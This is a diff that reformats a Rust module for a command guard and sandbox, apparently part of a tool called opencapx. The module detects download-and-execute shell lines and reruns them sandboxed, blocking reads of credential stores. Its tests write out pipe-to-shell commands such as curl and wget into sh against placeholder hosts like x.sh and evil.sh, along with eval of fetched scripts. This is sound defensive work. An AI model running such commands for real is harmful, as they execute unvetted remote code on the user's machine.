@@ -307,11 +307,7 @@ fn load_guard_file() -> GuardFile {
     let Ok(v) = serde_json::from_str::<serde_json::Value>(&raw) else {
         return GuardFile::default();
     };
-    let str_field = |name: &str| {
-        v.get(name)
-            .and_then(|d| d.as_str())
-            .map(|s| s.to_string())
-    };
+    let str_field = |name: &str| v.get(name).and_then(|d| d.as_str()).map(|s| s.to_string());
     GuardFile {
         trusted_domains: v
             .get("trusted_domains")
@@ -355,7 +351,11 @@ pub fn resolve_guard_settings() -> GuardSettings {
         Some(e) if e.eq_ignore_ascii_case("clear") => "clear",
         _ => "strip",
     };
-    GuardSettings { enabled, profile, env }
+    GuardSettings {
+        enabled,
+        profile,
+        env,
+    }
 }
 
 /// Load trusted domains. Fail-open: a missing or corrupt file means "nothing is trusted".
@@ -390,9 +390,8 @@ fn save_guard_file(f: &GuardFile) -> Result<(), String> {
             .map_err(|e| format!("write {}: {e}", path.display()))
     };
     #[cfg(not(unix))]
-    let write_0600 = || {
-        std::fs::write(&path, &body).map_err(|e| format!("write {}: {e}", path.display()))
-    };
+    let write_0600 =
+        || std::fs::write(&path, &body).map_err(|e| format!("write {}: {e}", path.display()));
     write_0600()?;
     #[cfg(unix)]
     {
@@ -412,7 +411,10 @@ fn save_trusted(domains: &[String]) -> Result<(), String> {
 /// danger-guard stance.
 /// `opencapx guard` — clap owns the parsing and the generated help.
 #[derive(clap::Parser)]
-#[command(name = "opencapx guard", about = "Danger-guard installer domains: trust / untrust / list / mode / env")]
+#[command(
+    name = "opencapx guard",
+    about = "Danger-guard installer domains: trust / untrust / list / mode / env"
+)]
 struct GuardCli {
     #[command(subcommand)]
     cmd: GuardCmd,
@@ -685,7 +687,13 @@ fn guard_split_lead(cmd: &str) -> Option<(&str, &str)> {
 /// `kind` is the bare binary name and decides the flag/conflict rules.
 /// Refuses when the downloader already chooses one (`-o`/`-O`/`--output`/`--remote-name` and
 /// their attached forms), because appending a second target could silently change semantics.
-fn download_to(dl_tok: &str, kind: &str, args: &str, tmp: &str, p: &GuardPatterns) -> Option<String> {
+fn download_to(
+    dl_tok: &str,
+    kind: &str,
+    args: &str,
+    tmp: &str,
+    p: &GuardPatterns,
+) -> Option<String> {
     for t in args.split_whitespace() {
         let conflict = match kind {
             "wget" => {
@@ -762,9 +770,7 @@ fn guard_with(
     let p = guard_patterns();
     let (lead, body) = guard_split_lead(command)?;
     let tmp = format!("\"${DL_VAR}\"");
-    let mktemp = format!(
-        "{DL_VAR}=\"$(mktemp \"${{TMPDIR:-/tmp}}/opencapx-dl-XXXXXX.sh\")\""
-    );
+    let mktemp = format!("{DL_VAR}=\"$(mktemp \"${{TMPDIR:-/tmp}}/opencapx-dl-XXXXXX.sh\")\"");
     let cleanup = format!("; {RC_VAR}=$?; rm -f \"${DL_VAR}\"; (exit ${RC_VAR})");
     let bin_q = shell_quote(bin);
     // Trusted passthrough requires: at least one URL, and EVERY URL in the line trusted —
@@ -777,14 +783,18 @@ fn guard_with(
     if let Some(c) = p.pipe_shell.captures(body) {
         // The verbatim downloader token as written (backslash quote / path prefix included).
         let dl_tok = &body[..c.get(2).unwrap().end()];
-        let sh_args = c.get(5).map(|m| m.as_str().trim().to_string()).unwrap_or_default();
+        let sh_args = c
+            .get(5)
+            .map(|m| m.as_str().trim().to_string())
+            .unwrap_or_default();
         // Only plain flags survive the rewrite. Bail (audit-only) when the shell takes:
         // stdin semantics (`-s`, bare `-`), an interactive flag (`-i`), or any positional
         // operand (`/dev/stdin`, a script name) — the file-based rewrite would change what
         // runs. The downloaded file is appended as the operand instead.
-        if sh_args.split_whitespace().any(|t| {
-            !t.starts_with('-') || t == "-" || t.contains('s') || t.contains('i')
-        }) {
+        if sh_args
+            .split_whitespace()
+            .any(|t| !t.starts_with('-') || t == "-" || t.contains('s') || t.contains('i'))
+        {
             return Some(audit_only(command, "danger/unsupported-shape"));
         }
         if is_trusted(&c[3]) {
@@ -919,7 +929,9 @@ pub fn env_is_secret(name: &str) -> bool {
 
 /// Variables that survive `Clear` — a shell inside the sandbox still needs to find binaries,
 /// a home, and a temp dir.
-const CLEAR_ENV_KEEP: &[&str] = &["PATH", "HOME", "TMPDIR", "USER", "SHELL", "LANG", "LC_ALL", "TERM"];
+const CLEAR_ENV_KEEP: &[&str] = &[
+    "PATH", "HOME", "TMPDIR", "USER", "SHELL", "LANG", "LC_ALL", "TERM",
+];
 
 fn apply_env_policy(cmd: &mut std::process::Command, policy: EnvPolicy) {
     match policy {
@@ -1109,7 +1121,9 @@ pub fn run_cli(args: &[String]) -> i32 {
             }
         },
         Backend::Unavailable(reason) => {
-            eprintln!("opencapx sandbox: WARNING: no sandbox backend ({reason}); running WITHOUT sandbox");
+            eprintln!(
+                "opencapx sandbox: WARNING: no sandbox backend ({reason}); running WITHOUT sandbox"
+            );
             audit_unguarded(&parsed.command, reason);
             run_plain(&parsed.command, parsed.timeout_secs, parsed.policy.env)
         }
@@ -1181,10 +1195,7 @@ fn backend() -> Backend {
 fn make_scratch() -> std::io::Result<PathBuf> {
     static SCRATCH_SEQ: AtomicU64 = AtomicU64::new(0);
     let seq = SCRATCH_SEQ.fetch_add(1, Ordering::Relaxed);
-    let dir = std::env::temp_dir().join(format!(
-        "opencapx-sandbox-{}-{seq}",
-        std::process::id()
-    ));
+    let dir = std::env::temp_dir().join(format!("opencapx-sandbox-{}-{seq}", std::process::id()));
     std::fs::create_dir_all(&dir)?;
     Ok(dir)
 }
@@ -1220,7 +1231,9 @@ fn spawn_and_wait(cmd: &mut std::process::Command, timeout_secs: Option<u64>) ->
                             if std::time::Instant::now() >= deadline {
                                 kill_group(child.id());
                                 let _ = child.kill();
-                                eprintln!("opencapx sandbox: timeout after {secs}s; killed process group");
+                                eprintln!(
+                                    "opencapx sandbox: timeout after {secs}s; killed process group"
+                                );
                                 return 124;
                             }
                             std::thread::sleep(std::time::Duration::from_millis(50));
@@ -1362,7 +1375,15 @@ fn bwrap_probe() -> bool {
         return false;
     };
     std::process::Command::new(bwrap)
-        .args(["--die-with-parent", "--unshare-all", "--ro-bind", "/", "/", "--", "/bin/true"])
+        .args([
+            "--die-with-parent",
+            "--unshare-all",
+            "--ro-bind",
+            "/",
+            "/",
+            "--",
+            "/bin/true",
+        ])
         .stdin(std::process::Stdio::null())
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
@@ -1377,7 +1398,13 @@ fn run_bwrap(parsed: &Parsed, scratch: &Path) -> std::io::Result<i32> {
         .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "bwrap not found"))?;
     let home = crate::core::home_dir().map(|h| canonicalize_lossy(&h));
     let mut cmd = std::process::Command::new(bwrap);
-    for a in bwrap_args(&parsed.policy, parsed.profile, scratch, home.as_deref(), &parsed.command) {
+    for a in bwrap_args(
+        &parsed.policy,
+        parsed.profile,
+        scratch,
+        home.as_deref(),
+        &parsed.command,
+    ) {
         cmd.arg(a);
     }
     apply_env_policy(&mut cmd, parsed.policy.env);
@@ -1462,7 +1489,11 @@ mod tests {
         // network=out → allow; no write declaration → no write rule
         let out = sandbox_profile_for(d, &decl("out", &[]));
         assert!(out.ends_with("(allow network*)\n"), "{}", out);
-        assert!(!out.contains("plugin-data"), "no declaration means no write is opened:\n{}", out);
+        assert!(
+            !out.contains("plugin-data"),
+            "no declaration means no write is opened:\n{}",
+            out
+        );
     }
 
     /// S5c — enforcement policy matrix: the three factors declaration/trust/switch.
@@ -1539,7 +1570,10 @@ mod tests {
             eprintln!("skip: no sandbox backend on this machine");
             return;
         }
-        assert_eq!(run_cli(&["--".into(), "sh".into(), "-c".into(), "exit 7".into()]), 7);
+        assert_eq!(
+            run_cli(&["--".into(), "sh".into(), "-c".into(), "exit 7".into()]),
+            7
+        );
     }
 
     /// The fence, end to end: a write outside the scratch dir must die, not land on the host.
@@ -1576,7 +1610,10 @@ mod tests {
             "-c".into(),
             "curl -s --max-time 5 https://example.com".into(),
         ]);
-        assert_ne!(code, 0, "curl must not reach the network inside the sandbox");
+        assert_ne!(
+            code, 0,
+            "curl must not reach the network inside the sandbox"
+        );
     }
 
     /// Regression: the scratch dir must be per-run, not per-process. Two concurrent runs in one
@@ -1603,24 +1640,48 @@ mod tests {
         .unwrap();
         assert_eq!(h.rule_id, "danger/download-pipe-shell");
         assert!(
-            h.command.contains("curl -fsSL https://x.sh -o \"$__ocx_dl\""),
+            h.command
+                .contains("curl -fsSL https://x.sh -o \"$__ocx_dl\""),
             "{}",
             h.command
         );
         // random path via mktemp + cleanup + real exit code propagation
-        assert!(h.command.starts_with("__ocx_dl=\"$(mktemp "), "{}", h.command);
-        assert!(h.command.contains("rm -f \"$__ocx_dl\"; (exit $__ocx_rc)"), "{}", h.command);
         assert!(
-            h.command.contains(
-                "sandbox --profile installer --env strip -- sh \"$__ocx_dl\""
-            ),
+            h.command.starts_with("__ocx_dl=\"$(mktemp "),
+            "{}",
+            h.command
+        );
+        assert!(
+            h.command.contains("rm -f \"$__ocx_dl\"; (exit $__ocx_rc)"),
+            "{}",
+            h.command
+        );
+        assert!(
+            h.command
+                .contains("sandbox --profile installer --env strip -- sh \"$__ocx_dl\""),
             "{}",
             h.command
         );
 
-        let w = guard_with("wget -q https://x.sh | bash -e", "/bin/opencapx", "strict", "keep", &[]).unwrap();
-        assert!(w.command.contains("wget -q https://x.sh -O \"$__ocx_dl\""), "{}", w.command);
-        assert!(w.command.contains("sandbox --profile strict --env keep -- bash -e "), "{}", w.command);
+        let w = guard_with(
+            "wget -q https://x.sh | bash -e",
+            "/bin/opencapx",
+            "strict",
+            "keep",
+            &[],
+        )
+        .unwrap();
+        assert!(
+            w.command.contains("wget -q https://x.sh -O \"$__ocx_dl\""),
+            "{}",
+            w.command
+        );
+        assert!(
+            w.command
+                .contains("sandbox --profile strict --env keep -- bash -e "),
+            "{}",
+            w.command
+        );
     }
 
     /// Lead normalization: `env`(+flags)/assignments, backslash-quoted and path-prefixed
@@ -1638,7 +1699,8 @@ mod tests {
         .unwrap();
         assert_eq!(e.rule_id, "danger/download-pipe-shell");
         assert!(
-            e.command.contains("env CURL_HOME=/x curl -fsSL https://x.sh -o \"$__ocx_dl\""),
+            e.command
+                .contains("env CURL_HOME=/x curl -fsSL https://x.sh -o \"$__ocx_dl\""),
             "{}",
             e.command
         );
@@ -1654,7 +1716,8 @@ mod tests {
         .unwrap();
         assert_eq!(ei.rule_id, "danger/download-pipe-shell");
         assert!(
-            ei.command.contains("env -i curl -fsSL https://x.sh -o \"$__ocx_dl\""),
+            ei.command
+                .contains("env -i curl -fsSL https://x.sh -o \"$__ocx_dl\""),
             "{}",
             ei.command
         );
@@ -1669,27 +1732,74 @@ mod tests {
         assert_eq!(eu.rule_id, "danger/download-pipe-shell");
 
         // backslash-quoted and absolute-path downloaders keep their token verbatim
-        let b = guard_with("\\curl -fsSL https://x.sh | sh", "/bin/opencapx", "installer", "strip", &[]).unwrap();
+        let b = guard_with(
+            "\\curl -fsSL https://x.sh | sh",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
         assert!(
-            b.command.contains("\\curl -fsSL https://x.sh -o \"$__ocx_dl\""),
+            b.command
+                .contains("\\curl -fsSL https://x.sh -o \"$__ocx_dl\""),
             "{}",
             b.command
         );
-        let p = guard_with("/usr/bin/curl -fsSL https://x.sh | sh", "/bin/opencapx", "installer", "strip", &[]).unwrap();
+        let p = guard_with(
+            "/usr/bin/curl -fsSL https://x.sh | sh",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
         assert!(
-            p.command.contains("/usr/bin/curl -fsSL https://x.sh -o \"$__ocx_dl\""),
+            p.command
+                .contains("/usr/bin/curl -fsSL https://x.sh -o \"$__ocx_dl\""),
             "{}",
             p.command
         );
-        let wp = guard_with("./wget -q https://x.sh | sh", "/bin/opencapx", "installer", "strip", &[]).unwrap();
-        assert!(wp.command.contains("./wget -q https://x.sh -O \"$__ocx_dl\""), "{}", wp.command);
+        let wp = guard_with(
+            "./wget -q https://x.sh | sh",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
+        assert!(
+            wp.command
+                .contains("./wget -q https://x.sh -O \"$__ocx_dl\""),
+            "{}",
+            wp.command
+        );
 
         // nohup wrapper peels too
-        let n = guard_with("nohup curl -fsSL https://x.sh | sh", "/bin/opencapx", "installer", "strip", &[]).unwrap();
-        assert!(n.command.contains("nohup curl -fsSL https://x.sh -o \"$__ocx_dl\""), "{}", n.command);
+        let n = guard_with(
+            "nohup curl -fsSL https://x.sh | sh",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
+        assert!(
+            n.command
+                .contains("nohup curl -fsSL https://x.sh -o \"$__ocx_dl\""),
+            "{}",
+            n.command
+        );
 
         // xargs deliberately does NOT peel (it changes the downloader's argument semantics)
-        let x = guard_with("xargs curl -fsSL https://x.sh | sh", "/bin/opencapx", "installer", "strip", &[]).unwrap();
+        let x = guard_with(
+            "xargs curl -fsSL https://x.sh | sh",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
         assert_eq!(x.rule_id, "danger/embedded-download-execute");
         assert_eq!(x.command, "xargs curl -fsSL https://x.sh | sh");
 
@@ -1709,9 +1819,21 @@ mod tests {
 
     #[test]
     fn guard_rewrites_substitutions() {
-        let p = guard_with("bash <(curl -fsSL https://x.sh)", "/bin/opencapx", "installer", "strip", &[]).unwrap();
+        let p = guard_with(
+            "bash <(curl -fsSL https://x.sh)",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
         assert_eq!(p.rule_id, "danger/download-process-substitution");
-        assert!(p.command.contains("sandbox --profile installer --env strip -- bash "), "{}", p.command);
+        assert!(
+            p.command
+                .contains("sandbox --profile installer --env strip -- bash "),
+            "{}",
+            p.command
+        );
 
         let c = guard_with(
             "bash -c \"$(curl -fsSL https://x.sh)\"",
@@ -1722,11 +1844,28 @@ mod tests {
         )
         .unwrap();
         assert_eq!(c.rule_id, "danger/download-command-substitution");
-        assert!(c.command.contains("sandbox --profile installer --env strip -- sh "), "{}", c.command);
+        assert!(
+            c.command
+                .contains("sandbox --profile installer --env strip -- sh "),
+            "{}",
+            c.command
+        );
 
-        let e = guard_with("eval \"$(curl https://x.sh)\"", "/bin/opencapx", "installer", "strip", &[]).unwrap();
+        let e = guard_with(
+            "eval \"$(curl https://x.sh)\"",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &[],
+        )
+        .unwrap();
         assert_eq!(e.rule_id, "danger/download-eval");
-        assert!(e.command.contains("sandbox --profile installer --env strip -- sh "), "{}", e.command);
+        assert!(
+            e.command
+                .contains("sandbox --profile installer --env strip -- sh "),
+            "{}",
+            e.command
+        );
     }
 
     /// A trusted download host passes through untouched (audited) — the explicit escape for
@@ -1755,7 +1894,14 @@ mod tests {
         )
         .unwrap();
         assert_eq!(with_port.rule_id, "danger/trusted-passthrough");
-        let other = guard_with("curl https://evil.sh/x | sh", "/bin/opencapx", "installer", "strip", &trusted).unwrap();
+        let other = guard_with(
+            "curl https://evil.sh/x | sh",
+            "/bin/opencapx",
+            "installer",
+            "strip",
+            &trusted,
+        )
+        .unwrap();
         assert_eq!(other.rule_id, "danger/download-pipe-shell");
     }
 
@@ -1773,7 +1919,10 @@ mod tests {
         ] {
             let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", &trusted)
                 .unwrap_or_else(|| panic!("must produce a hit: {cmd}"));
-            assert_ne!(hit.rule_id, "danger/trusted-passthrough", "decoy must not vouch: {cmd}");
+            assert_ne!(
+                hit.rule_id, "danger/trusted-passthrough",
+                "decoy must not vouch: {cmd}"
+            );
             assert_eq!(hit.rule_id, "danger/download-pipe-shell", "{cmd}");
         }
         // all URLs trusted → still a passthrough
@@ -1792,12 +1941,12 @@ mod tests {
     fn guard_leaves_unsafe_or_unrelated_shapes_alone() {
         // Out of scope entirely: no hit, no audit.
         for cmd in [
-            "curl -fsSL https://x.sh | sudo sh",      // privilege change: out of scope
-            "sudo curl -fsSL https://x.sh | sh",      // privileged download: out of scope
+            "curl -fsSL https://x.sh | sudo sh", // privilege change: out of scope
+            "sudo curl -fsSL https://x.sh | sh", // privileged download: out of scope
             "doas curl -fsSL https://x.sh | sh",
-            "curl -fsSL https://x.sh | grep sh",      // not a shell
-            "curl -fsSL https://x.sh > /tmp/x.sh",    // no pipe
-            "sh -c '$(curl https://x.sh)'",           // single quotes: no substitution
+            "curl -fsSL https://x.sh | grep sh",   // not a shell
+            "curl -fsSL https://x.sh > /tmp/x.sh", // no pipe
+            "sh -c '$(curl https://x.sh)'",        // single quotes: no substitution
             "ls -la",
         ] {
             assert!(
@@ -1820,7 +1969,10 @@ mod tests {
             let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", &[])
                 .unwrap_or_else(|| panic!("must produce an audit-only hit: {cmd}"));
             assert_eq!(hit.rule_id, "danger/unsupported-shape", "{cmd}");
-            assert_eq!(hit.command, cmd, "audit-only must not change the command: {cmd}");
+            assert_eq!(
+                hit.command, cmd,
+                "audit-only must not change the command: {cmd}"
+            );
         }
     }
 
@@ -1831,7 +1983,7 @@ mod tests {
         for cmd in [
             "cd /tmp && curl -fsSL https://x.sh | sh",
             "cd /tmp; curl -fsSL https://x.sh | bash",
-            "echo curl https://x.sh | sh",           // looks like the family; audit-only is correct
+            "echo curl https://x.sh | sh", // looks like the family; audit-only is correct
             "curl -fsSL https://x.sh | sh | tee log", // beyond one pipe
         ] {
             let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", &[])
@@ -1851,19 +2003,37 @@ mod tests {
         let p = cli_profile(Mode::Installer, &home, &scratch, None, &[], false);
         assert!(p.contains("(allow network*)"));
         assert!(p.contains("(allow file-write* (subpath \"/Users/test\"))"));
-        let allow_home = p.find("(allow file-write* (subpath \"/Users/test\"))").unwrap();
-        let deny_ssh = p.find("(deny file-read* (subpath \"/Users/test/.ssh\"))").unwrap();
-        let deny_rc = p.find("(deny file-write* (subpath \"/Users/test/.zshrc\"))").unwrap();
+        let allow_home = p
+            .find("(allow file-write* (subpath \"/Users/test\"))")
+            .unwrap();
+        let deny_ssh = p
+            .find("(deny file-read* (subpath \"/Users/test/.ssh\"))")
+            .unwrap();
+        let deny_rc = p
+            .find("(deny file-write* (subpath \"/Users/test/.zshrc\"))")
+            .unwrap();
         assert!(
             deny_ssh > allow_home && deny_rc > allow_home,
             "denies must come after the allows:\n{p}"
         );
         assert!(p.contains("(deny file-write* (subpath \"/Library/LaunchAgents\"))"));
         // cloud CLI / VCS credential stores — the exfiltration targets installer mode must close
-        assert!(p.contains("(deny file-read* (subpath \"/Users/test/.kube\"))"), "{p}");
-        assert!(p.contains("(deny file-read* (subpath \"/Users/test/.git-credentials\"))"), "{p}");
-        assert!(p.contains("(deny file-read* (subpath \"/Users/test/.config/gcloud\"))"), "{p}");
-        assert!(p.contains("(deny file-read* (subpath \"/Users/test/.azure\"))"), "{p}");
+        assert!(
+            p.contains("(deny file-read* (subpath \"/Users/test/.kube\"))"),
+            "{p}"
+        );
+        assert!(
+            p.contains("(deny file-read* (subpath \"/Users/test/.git-credentials\"))"),
+            "{p}"
+        );
+        assert!(
+            p.contains("(deny file-read* (subpath \"/Users/test/.config/gcloud\"))"),
+            "{p}"
+        );
+        assert!(
+            p.contains("(deny file-read* (subpath \"/Users/test/.azure\"))"),
+            "{p}"
+        );
         assert!(
             p.contains("(deny file-read* (subpath \"/Users/test/Library/Application Support/Google/Chrome\"))"),
             "{p}"
@@ -1871,7 +2041,10 @@ mod tests {
 
         let s = cli_profile(Mode::Strict, &home, &scratch, None, &[], false);
         assert!(s.contains("(deny network*)"));
-        assert!(!s.contains("(subpath \"/Users/test\")"), "strict must not open $HOME:\n{s}");
+        assert!(
+            !s.contains("(subpath \"/Users/test\")"),
+            "strict must not open $HOME:\n{s}"
+        );
         let s_net = cli_profile(Mode::Strict, &home, &scratch, None, &[], true);
         assert!(s_net.contains("(allow network*)"));
     }
@@ -1916,10 +2089,22 @@ mod tests {
             .output()
             .expect("sandbox-exec run");
         let stdout = String::from_utf8_lossy(&out.stdout);
-        assert!(stdout.contains("READ_BLOCKED"), "secret read must be denied:\n{stdout}");
-        assert!(stdout.contains("RC_BLOCKED"), "rc write must be denied:\n{stdout}");
-        assert!(stdout.contains("WRITE_OK"), "ordinary home writes must work:\n{stdout}");
-        assert_eq!(std::fs::read_to_string(home.join(".zshrc")).unwrap(), "# rc\n");
+        assert!(
+            stdout.contains("READ_BLOCKED"),
+            "secret read must be denied:\n{stdout}"
+        );
+        assert!(
+            stdout.contains("RC_BLOCKED"),
+            "rc write must be denied:\n{stdout}"
+        );
+        assert!(
+            stdout.contains("WRITE_OK"),
+            "ordinary home writes must work:\n{stdout}"
+        );
+        assert_eq!(
+            std::fs::read_to_string(home.join(".zshrc")).unwrap(),
+            "# rc\n"
+        );
         let _ = std::fs::remove_dir_all(&home);
         let _ = std::fs::remove_dir_all(&scratch);
     }
@@ -1929,7 +2114,9 @@ mod tests {
     fn guard_trust_cli_roundtrip() {
         // Both guard-file tests flip the process-global OPEN_CAPX_GUARD_FILE — serialize
         // against each other AND against main's danger-guard hook test (shared crate lock).
-        let _g = crate::GUARD_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let _g = crate::GUARD_TEST_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
         let file = std::env::temp_dir().join(format!("ocx-guard-{}.json", std::process::id()));
         let _ = std::fs::remove_file(&file);
         std::env::set_var("OPEN_CAPX_GUARD_FILE", &file);
@@ -1947,7 +2134,9 @@ mod tests {
     /// and `resolve_guard_settings` applies env > file > default precedence.
     #[test]
     fn guard_mode_roundtrip_and_precedence() {
-        let _g = crate::GUARD_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let _g = crate::GUARD_TEST_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
         let file = std::env::temp_dir().join(format!("ocx-guard-mode-{}.json", std::process::id()));
         let _ = std::fs::remove_file(&file);
         std::env::set_var("OPEN_CAPX_GUARD_FILE", &file);
@@ -1955,19 +2144,31 @@ mod tests {
         // default: on, installer, strip
         assert_eq!(
             resolve_guard_settings(),
-            GuardSettings { enabled: true, profile: "installer", env: "strip" }
+            GuardSettings {
+                enabled: true,
+                profile: "installer",
+                env: "strip"
+            }
         );
         // file sets strict
         assert_eq!(run_guard_cli(&["mode".into(), "strict".into()]), 0);
         assert_eq!(
             resolve_guard_settings(),
-            GuardSettings { enabled: true, profile: "strict", env: "strip" }
+            GuardSettings {
+                enabled: true,
+                profile: "strict",
+                env: "strip"
+            }
         );
         // a trust edit preserves the mode field
         assert_eq!(run_guard_cli(&["trust".into(), "x.sh".into()]), 0);
         assert_eq!(
             resolve_guard_settings(),
-            GuardSettings { enabled: true, profile: "strict", env: "strip" },
+            GuardSettings {
+                enabled: true,
+                profile: "strict",
+                env: "strip"
+            },
             "trust edit must not clobber danger_guard"
         );
         assert_eq!(load_trusted(), vec!["x.sh".to_string()]);
@@ -1975,12 +2176,20 @@ mod tests {
         assert_eq!(run_guard_cli(&["env".into(), "keep".into()]), 0);
         assert_eq!(
             resolve_guard_settings(),
-            GuardSettings { enabled: true, profile: "strict", env: "keep" }
+            GuardSettings {
+                enabled: true,
+                profile: "strict",
+                env: "keep"
+            }
         );
         assert_eq!(run_guard_cli(&["mode".into(), "off".into()]), 0);
         assert_eq!(
             resolve_guard_settings(),
-            GuardSettings { enabled: false, profile: "installer", env: "keep" },
+            GuardSettings {
+                enabled: false,
+                profile: "installer",
+                env: "keep"
+            },
             "mode edit must not clobber env"
         );
         assert_eq!(run_guard_cli(&["env".into(), "strip".into()]), 0);
@@ -1988,7 +2197,11 @@ mod tests {
         std::env::set_var("OPEN_CAPX_DANGER_GUARD", "Strict");
         assert_eq!(
             resolve_guard_settings(),
-            GuardSettings { enabled: true, profile: "strict", env: "strip" },
+            GuardSettings {
+                enabled: true,
+                profile: "strict",
+                env: "strip"
+            },
             "Strict must resolve to strict, not silently back to installer"
         );
         std::env::set_var("OPEN_CAPX_DANGER_GUARD", "OFF");
@@ -2030,7 +2243,16 @@ mod tests {
         ] {
             assert!(env_is_secret(name), "must be classified secret: {name}");
         }
-        for name in ["PATH", "HOME", "TMPDIR", "http_proxy", "RUST_LOG", "NVM_DIR", "LC_ALL", "MONKEY"] {
+        for name in [
+            "PATH",
+            "HOME",
+            "TMPDIR",
+            "http_proxy",
+            "RUST_LOG",
+            "NVM_DIR",
+            "LC_ALL",
+            "MONKEY",
+        ] {
             assert!(!env_is_secret(name), "must stay visible: {name}");
         }
     }
@@ -2038,7 +2260,10 @@ mod tests {
     /// `--env` parses; default is Strip.
     #[test]
     fn parse_env_flag_defaults_to_strip() {
-        assert_eq!(parse_args(&["--".into(), "ls".into()]).unwrap().policy.env, EnvPolicy::Strip);
+        assert_eq!(
+            parse_args(&["--".into(), "ls".into()]).unwrap().policy.env,
+            EnvPolicy::Strip
+        );
         let p = parse_args(&["--env".into(), "keep".into(), "--".into(), "ls".into()]).unwrap();
         assert_eq!(p.policy.env, EnvPolicy::Keep);
         let p = parse_args(&["--env".into(), "clear".into(), "--".into(), "ls".into()]).unwrap();
@@ -2060,7 +2285,10 @@ mod tests {
         let ov = installer_overlays(&home);
         assert!(ov.contains(&(home.join(".ssh"), Overlay::Tmpfs)), "{ov:?}");
         assert!(ov.contains(&(home.join(".kube"), Overlay::Tmpfs)), "{ov:?}");
-        assert!(ov.contains(&(home.join(".zshrc"), Overlay::DevNull)), "{ov:?}");
+        assert!(
+            ov.contains(&(home.join(".zshrc"), Overlay::DevNull)),
+            "{ov:?}"
+        );
         assert!(
             !ov.iter().any(|(p, _)| *p == home.join(".gnupg")),
             "missing path must be skipped: {ov:?}"
